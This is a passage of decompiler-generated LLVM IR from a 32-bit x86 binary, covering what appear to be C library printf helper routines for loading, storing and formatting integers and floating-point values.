  %v1_80523c3 = and i32 %v2_80523c1, -4
  store i32 %v1_80523c3, i32* %eax.global-to-local, align 4
  %v1_80523c6 = trunc i32 %v1_80523c3 to i16
  %v3_80523c6 = inttoptr i32 %v2_80523c6 to i16*
  store i16 %v1_80523c6, i16* %v3_80523c6, align 2
  %v0_80523c9 = load i32, i32* @ebx, align 4
  %v1_80523c9 = add i32 %v0_80523c9, 8
  %v2_80523c9 = inttoptr i32 %v1_80523c9 to i32*
  %v3_80523c9 = load i32, i32* %v2_80523c9, align 4
  store i32 %v3_80523c9, i32* %eax.global-to-local, align 4
  %v2_80523cc = add i32 %v0_80523c9, 24
  %v3_80523cc = inttoptr i32 %v2_80523cc to i32*
  store i32 %v3_80523c9, i32* %v3_80523cc, align 4
  %v0_80523cf = load i32, i32* %eax.global-to-local, align 4
  %v1_80523cf = load i32, i32* @ebx, align 4
  %v2_80523cf = add i32 %v1_80523cf, 16
  %v3_80523cf = inttoptr i32 %v2_80523cf to i32*
  store i32 %v0_80523cf, i32* %v3_80523cf, align 4
  %v0_80523d2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80523d2 = load i32, i32* @ebx, align 4
  %v2_80523d2 = add i32 %v1_80523d2, 20
  %v3_80523d2 = inttoptr i32 %v2_80523d2 to i32*
  store i32 %v0_80523d2, i32* %v3_80523d2, align 4
  %v0_80523d5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80523d5

dec_label_pc_80523d5:                             ; preds = %dec_label_pc_805238b, %dec_label_pc_80523c1
  %v2_80523dc = phi i32 [ %v0_80523b4, %dec_label_pc_805238b ], [ %v0_80523d5.pre, %dec_label_pc_80523c1 ]
  %v1_80523d5 = inttoptr i32 %v2_80523dc to i32*
  %v2_80523d5 = load i32, i32* %v1_80523d5, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80523d9 = or i32 %v2_80523d5, 64
  store i32 %v1_80523d9, i32* %eax.global-to-local, align 4
  %v1_80523dc = trunc i32 %v1_80523d9 to i16
  %v3_80523dc = inttoptr i32 %v2_80523dc to i16*
  store i16 %v1_80523dc, i16* %v3_80523dc, align 2
  %v0_80523df = load i32, i32* %eax.global-to-local, align 4
  %v1_80523df = urem i32 %v0_80523df, 65536
  store i32 %v1_80523df, i32* %eax.global-to-local, align 4
  %v3_80523e2 = and i32 %v0_80523df, 2816
  %v4_80523e2 = icmp eq i32 %v3_80523e2, 0
  %v1_80523e5 = icmp eq i1 %v4_80523e2, false
  br i1 %v1_80523e5, label %dec_label_pc_80523ed, label %dec_label_pc_80523e7

dec_label_pc_80523e7:                             ; preds = %dec_label_pc_80523d5
  %v0_80523e7 = load i32, i32* @ebx, align 4
  %v1_80523e7 = add i32 %v0_80523e7, 12
  %v2_80523e7 = inttoptr i32 %v1_80523e7 to i32*
  %v3_80523e7 = load i32, i32* %v2_80523e7, align 4
  store i32 %v3_80523e7, i32* %eax.global-to-local, align 4
  %v2_80523ea = add i32 %v0_80523e7, 28
  %v3_80523ea = inttoptr i32 %v2_80523ea to i32*
  store i32 %v3_80523e7, i32* %v3_80523ea, align 4
  br label %dec_label_pc_80523ed

dec_label_pc_80523ed:                             ; preds = %dec_label_pc_80523d5, %dec_label_pc_805237e, %dec_label_pc_80523e7
  %v0_80523ed = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80523ed, i32* %eax.global-to-local, align 4
  %v2_80523ef = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80523ef, i32* %edx.global-to-local, align 4
  store i32 %v0_805234c, i32* @ebx, align 4
  ret i32 %v0_80523ed

; uselistorder directives
  uselistorder i32 %v0_80523df, { 1, 0 }
  uselistorder i32 %v1_80523a2, { 1, 0, 2 }
  uselistorder i32 %v0_80523b4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8052358, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805234c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 16, 4, 7, 6, 17, 5, 2, 3, 10, 9, 1, 11, 8, 13, 14, 15, 12 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80523ed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80523d5, { 1, 0 }
  uselistorder label %dec_label_pc_805236b, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_80523f4 = icmp slt i32 %tmp5, 0
  %v3_8052425 = and i32 %tmp4, 2048
  %v4_8052425 = icmp eq i32 %v3_8052425, 0
  br i1 %v5_80523f4, label %dec_label_pc_8052425, label %dec_label_pc_8052403

dec_label_pc_8052403:                             ; preds = %entry
  %v1_8052406 = icmp eq i1 %v4_8052425, false
  br i1 %v1_8052406, label %dec_label_pc_805242a, label %dec_label_pc_8052408

dec_label_pc_8052408:                             ; preds = %dec_label_pc_8052403
  %v6_8052408 = icmp eq i32 %tmp4, 256
  %v1_805240e = inttoptr i32 %tmp to i32*
  %v2_805240e = load i32, i32* %v1_805240e, align 4
  %v1_8052410 = icmp eq i1 %v6_8052408, false
  br i1 %v1_8052410, label %dec_label_pc_8052417, label %dec_label_pc_8052412

dec_label_pc_8052412:                             ; preds = %dec_label_pc_8052408
  %v1_8052412 = urem i32 %v2_805240e, 256
  br label %dec_label_pc_8052422

dec_label_pc_8052417:                             ; preds = %dec_label_pc_8052408
  %v6_8052417 = icmp eq i32 %tmp4, 512
  %v1_805241d = icmp eq i1 %v6_8052417, false
  br i1 %v1_805241d, label %dec_label_pc_8052422, label %dec_label_pc_805241f

dec_label_pc_805241f:                             ; preds = %dec_label_pc_8052417
  %v1_805241f = urem i32 %v2_805240e, 65536
  br label %dec_label_pc_8052422

dec_label_pc_8052422:                             ; preds = %dec_label_pc_8052417, %dec_label_pc_8052412, %dec_label_pc_805241f
  %v0_8052424 = phi i32 [ %v2_805240e, %dec_label_pc_8052417 ], [ %v1_8052412, %dec_label_pc_8052412 ], [ %v1_805241f, %dec_label_pc_805241f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8052424

dec_label_pc_8052425:                             ; preds = %entry
  br i1 %v4_8052425, label %dec_label_pc_8052430, label %dec_label_pc_805242a

dec_label_pc_805242a:                             ; preds = %dec_label_pc_8052425, %dec_label_pc_8052403
  %v1_805242a = add i32 %tmp, 4
  %v2_805242a = inttoptr i32 %v1_805242a to i32*
  %v3_805242a = load i32, i32* %v2_805242a, align 4
  store i32 %v3_805242a, i32* @edx, align 4
  %v1_805242d = inttoptr i32 %tmp to i32*
  %v2_805242d = load i32, i32* %v1_805242d, align 4
  ret i32 %v2_805242d

dec_label_pc_8052430:                             ; preds = %dec_label_pc_8052425
  %v6_8052430 = icmp eq i32 %tmp4, 256
  %v1_8052436 = inttoptr i32 %tmp to i32*
  %v2_8052436 = load i32, i32* %v1_8052436, align 4
  %v1_8052438 = icmp eq i1 %v6_8052430, false
  br i1 %v1_8052438, label %dec_label_pc_805243f, label %dec_label_pc_805243a

dec_label_pc_805243a:                             ; preds = %dec_label_pc_8052430
  %v1_805243a = mul i32 %v2_8052436, 16777216
  %v2_805243a = sdiv i32 %v1_805243a, 16777216
  br label %dec_label_pc_8052448

dec_label_pc_805243f:                             ; preds = %dec_label_pc_8052430
  %v6_805243f = icmp eq i32 %tmp4, 512
  %v1_8052445 = icmp eq i1 %v6_805243f, false
  br i1 %v1_8052445, label %dec_label_pc_8052448, label %dec_label_pc_8052447

dec_label_pc_8052447:                             ; preds = %dec_label_pc_805243f
  %v1_8052447 = mul i32 %v2_8052436, 65536
  %v2_8052447 = sdiv i32 %v1_8052447, 65536
  br label %dec_label_pc_8052448

dec_label_pc_8052448:                             ; preds = %dec_label_pc_805243f, %dec_label_pc_805243a, %dec_label_pc_8052447
  %v0_8052448 = phi i32 [ %v2_8052436, %dec_label_pc_805243f ], [ %v2_805243a, %dec_label_pc_805243a ], [ %v2_8052447, %dec_label_pc_8052447 ]
  %v1_8052448 = ashr i32 %v0_8052448, 31
  store i32 %v1_8052448, i32* @edx, align 4
  ret i32 %v0_8052448

; uselistorder directives
  uselistorder i32 %v0_8052448, { 1, 0 }
  uselistorder i32 %v2_8052436, { 2, 0, 1 }
  uselistorder i32 %v2_805240e, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8052448, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052422, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805244c = load i32, i32* @ebx, align 4
  store i32 %v0_805244c, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8052451 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8052451, i32* %ebx.global-to-local, align 4
  %v4_8052455 = trunc i32 %tmp4 to i16
  %v6_805245d = icmp eq i32 %tmp6, 256
  %v1_8052463 = icmp eq i1 %v6_805245d, false
  br i1 %v1_8052463, label %dec_label_pc_8052469, label %dec_label_pc_8052465

dec_label_pc_8052465:                             ; preds = %entry
  %v2_8052465 = trunc i32 %tmp4 to i8
  %v4_8052465 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8052465, i8* %v4_8052465, align 1
  br label %dec_label_pc_8052487

dec_label_pc_8052469:                             ; preds = %entry
  %v6_8052469 = icmp eq i32 %tmp6, 2048
  %v1_805246f = icmp eq i1 %v6_8052469, false
  br i1 %v1_805246f, label %dec_label_pc_8052478, label %dec_label_pc_8052471

dec_label_pc_8052471:                             ; preds = %dec_label_pc_8052469
  %sext2 = mul i32 %tmp4, 65536
  %v1_8052471 = sdiv i32 %sext2, 65536
  %v3_8052471 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8052471, i32* %v3_8052471, align 4
  %v0_8052473 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052473 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052473 = add i32 %v1_8052473, 4
  %v3_8052473 = inttoptr i32 %v2_8052473 to i32*
  store i32 %v0_8052473, i32* %v3_8052473, align 4
  br label %dec_label_pc_8052487

dec_label_pc_8052478:                             ; preds = %dec_label_pc_8052469
  %v6_8052478 = icmp eq i32 %tmp6, 512
  %v1_805247e = icmp eq i1 %v6_8052478, false
  br i1 %v1_805247e, label %dec_label_pc_8052485, label %dec_label_pc_8052480

dec_label_pc_8052480:                             ; preds = %dec_label_pc_8052478
  store i16 %v4_8052455, i16* %tmp5, align 2
  br label %dec_label_pc_8052487

dec_label_pc_8052485:                             ; preds = %dec_label_pc_8052478
  %sext3 = mul i32 %tmp4, 65536
  %v1_8052485 = sdiv i32 %sext3, 65536
  %v3_8052485 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8052485, i32* %v3_8052485, align 4
  br label %dec_label_pc_8052487

dec_label_pc_8052487:                             ; preds = %dec_label_pc_8052480, %dec_label_pc_8052471, %dec_label_pc_8052465, %dec_label_pc_8052485
  %v2_8052487 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052487, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8052488 = sdiv i32 %sext, 65536
  ret i32 %v1_8052488

; uselistorder directives
  uselistorder label %dec_label_pc_8052487, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8052497 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052497, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80524a3 = icmp slt i32 %arg4, 0
  %v1_80524a5 = icmp eq i1 %v2_80524a3, false
  br i1 %v1_80524a5, label %dec_label_pc_80524c6, label %dec_label_pc_80524a7

dec_label_pc_80524a7:                             ; preds = %entry
  %v1_80524a7 = sub i32 0, %arg4
  store i32 %v1_80524a7, i32* %esi.global-to-local, align 4
  %v2_80524a9 = icmp slt i32 %arg3, 0
  %v1_80524ab = icmp eq i1 %v2_80524a9, false
  br i1 %v1_80524ab, label %dec_label_pc_80524c6, label %dec_label_pc_80524ad

dec_label_pc_80524ad:                             ; preds = %dec_label_pc_80524a7
  %v1_80524ad = sub i32 0, %arg2
  %v5_80524ad = icmp ne i32 %arg2, 0
  store i32 %v1_80524ad, i32* %ecx.global-to-local, align 4
  %v2_80524af = zext i1 %v5_80524ad to i32
  %v3_80524af = add i32 %v2_80524af, %arg3
  %v1_80524b2 = sub i32 0, %v3_80524af
  store i32 %v1_80524b2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80524c6

dec_label_pc_80524c6:                             ; preds = %entry, %dec_label_pc_80524a7, %dec_label_pc_80524ad
  %v0_80524cb = phi i32 [ %v1_80524a7, %dec_label_pc_80524ad ], [ %v1_80524a7, %dec_label_pc_80524a7 ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_80524ad ], [ 0, %dec_label_pc_80524a7 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_80524cb
  %tmp30 = urem i32 -1, %v0_80524cb
  store i8 0, i8* %arg1, align 1
  %v1_80524d0 = add i32 %tmp30, 1
  %v1_80524d1 = load i32, i32* %esi.global-to-local, align 4
  %v12_80524d1 = icmp eq i32 %v1_80524d0, %v1_80524d1
  %v1_80524db = icmp eq i1 %v12_80524d1, false
  br i1 %v1_80524db, label %dec_label_pc_80524ea, label %dec_label_pc_80524dd

dec_label_pc_80524dd:                             ; preds = %dec_label_pc_80524c6
  %v1_80524dd = add i32 %div, 1
  br label %dec_label_pc_80524ea

dec_label_pc_80524ea:                             ; preds = %dec_label_pc_80524c6, %dec_label_pc_80524dd
  %stack_var_-20.0.off0 = phi i32 [ %v1_80524d0, %dec_label_pc_80524c6 ], [ 0, %dec_label_pc_80524dd ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_80524c6 ], [ %v1_80524dd, %dec_label_pc_80524dd ]
  %v0_80524ea = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80524ea, i32* %ebp.global-to-local, align 4
  %v0_80524ec = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80524ec, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80524f0

dec_label_pc_80524f0:                             ; preds = %dec_label_pc_805253e, %dec_label_pc_80524ea
  %v0_8052527 = phi i32 [ %v0_8052540, %dec_label_pc_805253e ], [ %v0_80524ea, %dec_label_pc_80524ea ]
  %v0_80524f4 = phi i32 [ %v1_8052542, %dec_label_pc_805253e ], [ %v0_80524ec, %dec_label_pc_80524ea ]
  %v1_80524f0 = icmp eq i32 %v0_80524f4, 0
  br i1 %v1_80524f0, label %dec_label_pc_8052527, label %dec_label_pc_80524f4

dec_label_pc_80524f4:                             ; preds = %dec_label_pc_80524f0
  %v0_80524f8 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_80524f4, %v0_80524f8
  %tmp31 = urem i32 %v0_80524f4, %v0_80524f8
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8052527, %v0_80524f8
  %tmp32 = urem i32 %v0_8052527, %v0_80524f8
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_805250b = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_805250f = add i32 %tmp32, %v6_805250b
  %v8_8052515 = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_805251a = add i32 %div7, %v8_8052515
  store i32 %v2_805251a, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_805250f, %v0_80524f8
  %tmp33 = urem i32 %v2_805250f, %v0_80524f8
  %v2_8052522 = add i32 %div8, %v2_805251a
  br label %dec_label_pc_805252f

dec_label_pc_8052527:                             ; preds = %dec_label_pc_80524f0
  %v0_805252b = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8052527, %v0_805252b
  %tmp34 = urem i32 %v0_8052527, %v0_805252b
  br label %dec_label_pc_805252f

dec_label_pc_805252f:                             ; preds = %dec_label_pc_80524f4, %dec_label_pc_8052527
  %v13_8052535 = phi i32 [ %tmp33, %dec_label_pc_80524f4 ], [ %tmp34, %dec_label_pc_8052527 ]
  %storemerge = phi i32 [ %v2_8052522, %dec_label_pc_80524f4 ], [ %div10, %dec_label_pc_8052527 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_805252f = load i32, i32* %edi.global-to-local, align 4
  %v1_805252f = add i32 %v0_805252f, -1
  store i32 %v1_805252f, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8052535, 10
  br i1 %tmp, label %dec_label_pc_8052535, label %dec_label_pc_805253a

dec_label_pc_8052535:                             ; preds = %dec_label_pc_805252f
  %v2_8052535 = add i32 %v13_8052535, 48
  %v12_8052535 = and i32 %v2_8052535, 255
  %v14_8052535 = and i32 %v13_8052535, -256
  %v15_8052535 = or i32 %v12_8052535, %v14_8052535
  br label %dec_label_pc_805253e

dec_label_pc_805253a:                             ; preds = %dec_label_pc_805252f
  %v6_805253a = add i32 %v13_8052535, %arg5
  %v21_805253a = and i32 %v6_805253a, 255
  %v23_805253a = and i32 %v13_8052535, -256
  %v24_805253a = or i32 %v21_805253a, %v23_805253a
  br label %dec_label_pc_805253e

dec_label_pc_805253e:                             ; preds = %dec_label_pc_8052535, %dec_label_pc_805253a
  %storemerge9 = phi i32 [ %v15_8052535, %dec_label_pc_8052535 ], [ %v24_805253a, %dec_label_pc_805253a ]
  %v1_805253e = trunc i32 %storemerge9 to i8
  %v3_805253e = inttoptr i32 %v1_805252f to i8*
  store i8 %v1_805253e, i8* %v3_805253e, align 1
  %v0_8052540 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052542 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052542 = or i32 %v1_8052542, %v0_8052540
  %v3_8052542 = icmp eq i32 %v2_8052542, 0
  %v1_8052544 = icmp eq i1 %v3_8052542, false
  br i1 %v1_8052544, label %dec_label_pc_80524f0, label %dec_label_pc_8052546

dec_label_pc_8052546:                             ; preds = %dec_label_pc_805253e
  %v4_8052546 = icmp eq i32 %storemerge11, 0
  br i1 %v4_8052546, label %dec_label_pc_8052551, label %dec_label_pc_805254d

dec_label_pc_805254d:                             ; preds = %dec_label_pc_8052546
  %v0_805254d = load i32, i32* %edi.global-to-local, align 4
  %v1_805254d = add i32 %v0_805254d, -1
  store i32 %v1_805254d, i32* %edi.global-to-local, align 4
  %v1_805254e = inttoptr i32 %v1_805254d to i8*
  store i8 45, i8* %v1_805254e, align 1
  br label %dec_label_pc_8052551

dec_label_pc_8052551:                             ; preds = %dec_label_pc_8052546, %dec_label_pc_805254d
  %v0_8052554 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052554

; uselistorder directives
  uselistorder i32 %v13_8052535, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_805250f, { 1, 0 }
  uselistorder i32 %v0_80524f8, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_80524f4, { 1, 0, 2 }
  uselistorder i32 %v0_8052527, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80524d0, { 1, 0 }
  uselistorder i32 %v0_80524cb, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052551, { 1, 0 }
  uselistorder label %dec_label_pc_805253e, { 1, 0 }
  uselistorder label %dec_label_pc_805252f, { 1, 0 }
  uselistorder label %dec_label_pc_80524ea, { 1, 0 }
  uselistorder label %dec_label_pc_80524c6, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_5()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805255d = load i32, i32* @edi, align 4
  %v0_805255e = load i32, i32* @esi, align 4
  %v0_805255f = load i32, i32* @ebx, align 4
  store i32 %v0_805255f, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_8052574 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8052574 = add i3 %v4_8052574, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8052574, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_805257b = add i32 %tmp156, 4
  %v2_805257b = inttoptr i32 %v1_805257b to i32*
  %v3_805257b = load i32, i32* %v2_805257b, align 4
  store i32 %v3_805257b, i32* %eax.global-to-local, align 4
  %v1_8052582 = add i32 %tmp156, 8
  %v2_8052582 = inttoptr i32 %v1_8052582 to i8*
  %v3_8052582 = load i8, i8* %v2_8052582, align 1
  %v4_8052582 = zext i8 %v3_8052582 to i32
  %v6_8052582 = and i32 %v0_805255f, -256
  %v7_8052582 = or i32 %v4_8052582, %v6_8052582
  store i32 %v7_8052582, i32* %ebx.global-to-local, align 4
  %v1_8052585 = inttoptr i32 %tmp156 to i32*
  %v2_8052585 = load i32, i32* %v1_8052585, align 4
  store i32 %v2_8052585, i32* %ebp.global-to-local, align 4
  %v2_8052591 = or i8 %v3_8052582, 32
  %v7_8052591 = zext i8 %v2_8052591 to i32
  %v9_8052591 = and i32 %v3_805257b, -256
  %v10_8052591 = or i32 %v7_8052591, %v9_8052591
  store i32 %v10_8052591, i32* %eax.global-to-local, align 4
  %v10_8052593 = icmp eq i8 %v2_8052591, 97
  %v1_8052599 = icmp eq i1 %v10_8052593, false
  br i1 %v1_8052599, label %dec_label_pc_80525a2, label %dec_label_pc_805259b

dec_label_pc_805259b:                             ; preds = %entry
  %v2_805259b = add i8 %v3_8052582, 6
  %v15_805259b = zext i8 %v2_805259b to i32
  %v18_805259b = or i32 %v15_805259b, %v6_8052582
  store i32 %v18_805259b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80525a2

dec_label_pc_80525a2:                             ; preds = %entry, %dec_label_pc_805259b
  %stack_var_-207.0 = phi i8 [ %v3_8052582, %entry ], [ %v2_805259b, %dec_label_pc_805259b ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_80525a9 = icmp slt i32 %v2_8052585, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_80525b8 = select i1 %v2_80525a9, i32 6, i32 %v2_8052585
  store i32 %v3_80525b8, i32* %ebp.global-to-local, align 4
  %v1_80525bb = add i32 %tmp156, 12
  %v2_80525bb = inttoptr i32 %v1_80525bb to i32*
  %v3_80525bb = load i32, i32* %v2_80525bb, align 4
  store i32 %v3_80525bb, i32* %eax.global-to-local, align 4
  %v2_80525be = and i32 %v3_80525bb, 2
  %v3_80525be = icmp eq i32 %v2_80525be, 0
  br i1 %v3_80525be, label %dec_label_pc_80525cc, label %dec_label_pc_80525d8

dec_label_pc_80525cc:                             ; preds = %dec_label_pc_80525a2
  %v2_80525cc = urem i32 %v3_80525bb, 2
  %tmp192 = trunc i32 %v2_80525cc to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_80525d8

dec_label_pc_80525d8:                             ; preds = %dec_label_pc_80525cc, %dec_label_pc_80525a2
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_80525a2 ], [ %tmp193, %dec_label_pc_80525cc ]
  %not.v5_80525d8 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_80525d8, label %dec_label_pc_805264f, label %dec_label_pc_80525fa

dec_label_pc_80525fa:                             ; preds = %dec_label_pc_80525d8
  %v1_80525fa = add i3 %v4_8052574, -2
  store i3 %v1_80525fa, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_80525fe = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_80525fe, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_80525fa
  br label %dec_label_pc_805268a

bb180:                                            ; preds = %dec_label_pc_80525fa
  %v5_80525fe = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_80525fe, label %bb181, label %dec_label_pc_8052602

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_805268a

dec_label_pc_8052602:                             ; preds = %bb180
  %not.v4_80525fc = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_80525fc, label %dec_label_pc_805268a, label %dec_label_pc_805271f

dec_label_pc_805264f:                             ; preds = %dec_label_pc_80525d8
  store i3 %v4_8052574, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8052656 = add i32 %tmp156, 16
  %v2_8052656 = inttoptr i32 %v1_8052656 to i32*
  store i32 32, i32* %v2_8052656, align 4
  %v4_805265d = add i8 %stack_var_-207.0, -96
  %v6_805265d = sub i8 95, %stack_var_-207.0
  %v7_805265d = and i8 %v6_805265d, %stack_var_-207.0
  %v8_805265d = icmp slt i8 %v7_805265d, 0
  %v9_805265d = icmp eq i8 %v4_805265d, 0
  %v10_805265d = icmp slt i8 %v4_805265d, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_8052672 = icmp eq i1 %v10_805265d, %v8_805265d
  %v4_8052672 = icmp eq i1 %v9_805265d, false
  %v5_8052672 = and i1 %v4_8052672, %v3_8052672
  br i1 %v5_8052672, label %dec_label_pc_8052679, label %dec_label_pc_8052674

dec_label_pc_8052674:                             ; preds = %dec_label_pc_805264f
  br label %dec_label_pc_8052679

dec_label_pc_8052679:                             ; preds = %dec_label_pc_805264f, %dec_label_pc_8052674
  %v2_8052681 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052681, i32* @ecx, align 4
  br label %dec_label_pc_8052a4a

dec_label_pc_805268a:                             ; preds = %dec_label_pc_8052602, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_80526a4 = xor i3 %v4_8052574, -4
  store i3 %v3_80526a4, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80526aa

dec_label_pc_80526aa:                             ; preds = %dec_label_pc_80526fb, %dec_label_pc_805268a
  %v0_80526fb = phi i32 [ 4096, %dec_label_pc_805268a ], [ %v2_80526fb, %dec_label_pc_80526fb ]
  %v2_80526ad = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_805268a ], [ %v2_80526ad81, %dec_label_pc_80526fb ]
  %v1_80526e5 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_805268a ], [ %v0_80526aa79, %dec_label_pc_80526fb ]
  %v0_80526f766 = phi i32 [ 13, %dec_label_pc_805268a ], [ %v1_80526ac, %dec_label_pc_80526fb ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_805268a ], [ %stack_var_-220.1, %dec_label_pc_80526fb ]
  %v1_80526ac = add i32 %v0_80526f766, -1
  %v4_80526ad = fcmp ule x86_fp80 %v1_80526e5, %v2_80526ad
  br i1 %v4_80526ad, label %dec_label_pc_80526d4, label %dec_label_pc_80526b1

dec_label_pc_80526b1:                             ; preds = %dec_label_pc_80526aa
  store x86_fp80 %v1_80526e5, x86_fp80* %st0.global-to-local, align 4
